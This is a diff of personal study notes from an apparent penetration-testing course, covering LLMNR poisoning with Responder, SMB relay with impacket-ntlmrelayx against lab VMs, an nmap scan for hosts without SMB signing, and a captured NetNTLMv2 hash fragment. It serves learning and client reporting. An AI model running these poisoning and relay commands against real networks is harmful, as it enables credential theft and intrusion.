@@ -2531,7 +2531,7 @@ On one of client
 > [!todo] 
 >  In Kali run `sudo responder -I eth0 -rdwv`
 >  for me parameter `-rdwv` gave error. 
-> I try it with following command `sudo responder -I eth0 -Pv`
+> I try it with following command `sudo responder -I eth0 -Adwv`
 
 ![[Pasted image 20230219150535.png]]
 
@@ -2579,4 +2579,103 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 ![[Pasted image 20230219155148.png]]
 
 ### LLMNR Poisoning Defense
+
+![[Pasted image 20230311154640.png]]
+
+> [!info] 
+> Send to client how to fix Issue or put it in report
+> 
+
+> [!tip] 
+> Inform customer about risk of short passwords. 
+> 
+
+### SMB Relay Attacks Overview
+
+![[Pasted image 20230311161827.png]]
+
+![[Pasted image 20230311162545.png]]
+
+> [!todo] 
+> We only capture to SMB, but don't interact:
+> Adjust `Responder.conf`
+> `sudo pico /usr/share/responder/Responder.conf`
+> We use other tool to relay
+> 
+
+![[Pasted image 20230311163155.png]]
+
+> [!todo] 
+> Start responder:
+> `sudo responder -I eth0 -Adwv` 
+
+![[Pasted image 20230311170128.png]]
+
+> [!todo] 
+> Install ntlmrelayx on Kali:
+> https://www.kali.org/tools/impacket/
+> `sudo apt install python3-impacket`
+
+> [!todo] 
+> Run SMB Relay
+> `impacket-ntlmrelayx -tf targets.txt -smb2support` 
+
+> [!caution] 
+> Don't forget that this attack is only working if you're Administrator on Computer. 
+
+![[Pasted image 20230311175315.png]]
+
+### Quick Lab Update
+
+> [!attention] 
+> That is attack is working we have to enable `Network Discovery` 
+> We have to this on both on our VMs
+
+![[Pasted image 20230311181427.png]]
+
+### Discovering Hosts with SMB Signing Disabled
+
+> [!faq] 
+>  **Question**: My SMB relay is not working. How do I resolve?
+>  ---
+>  **Resolution**: There have been reports that SMB is failing to relay for some users in their labs. If this is happening, attempt to navigate to the attacker’s IP address from a web browser (such as \192.168.10.1) instead of the SMB event. You should trigger a relay.
+
+> [!tip] 
+> - You could  run a Nessus scan to get hosts with SMB Signing Disabled
+> - Also via `nmap` scan
+> - Search on github for it
+
+> [!todo] 
+>  **nmap scan**
+>  `sudo nmap --script=smb2-security-mode.nse -p445 192.168.203.0/24`
+
+> [!caution] 
+> Run command as root, otherwise you will not get any detail information
+> 
+
+![[Pasted image 20230311184012.png]]
+
+> [!todo] 
+> Put a target IP which not required signing  to `targets.txt`
+
+### SMB Relay Attack Demonstration Part 1
+
+![[Pasted image 20230311184946.png]]
+
+> [!todo] 
+> Run command:
+>  `sudo responder -I eth0 -Adwv`
+
+![[Pasted image 20230311185520.png]]
+
+> [!todo] 
+> Start responder:
+> `sudo responder -I eth0 -Adwv` 
+
+> [!todo] 
+> On Windows VM, put IP of Kali Machine:
+> `\\ip-kali-machine`
+
+![[Pasted image 20230311190013.png]]
+
 
